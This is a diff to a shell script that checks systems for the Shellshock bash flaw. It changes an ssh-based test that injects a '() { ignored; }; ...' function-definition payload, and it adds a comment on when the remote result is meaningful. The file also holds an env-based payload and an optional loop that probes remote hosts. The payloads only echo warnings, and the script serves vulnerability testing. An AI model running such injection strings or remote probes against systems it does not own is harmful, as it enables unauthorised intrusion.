@@ -39,11 +39,12 @@ env blahblah='() { :;}; echo YOUR SYSTEM SHELL IS VULNERABLE!' sh -c "echo test 
 
 echo "test 5"
 #Test the exploit via the SSH_ORIGINAL_COMMAND env var of ssh:
-ssh -o 'rsaauthentication yes' 0 '() { ignored; }; echo YOUR SYSTEM IS REMOTELY EXPLOITABLE!!!'
+ssh -o 'rsaauthentication yes' another@0 '() { ignored; }; echo YOUR SYSTEM MAY BE REMOTELY EXPLOITABLE!!!'
 echo "test 5 finished"
 
 #Set HOSTS_TO_PROBE to a file that lists hosts if you want this to probe remotely.
 # Careful with this. Admins might get irritated.
+# BTW, this is only valid if the user you're logging in with ssh as (either in the host definition or your login name, has no access to the machine. If they have access, then of course you can run arbitrary commands and the 'EXPLOITABLE' warning is irrelevant.
 if [ ! -z "$HOSTS_TO_PROBE" ]; then
 	echo "Please, if you discover a host that is vulnerable and does not belong to you, contact them and inform them!"
 	for host in `cat "${HOSTS_TO_PROBE}"`; do
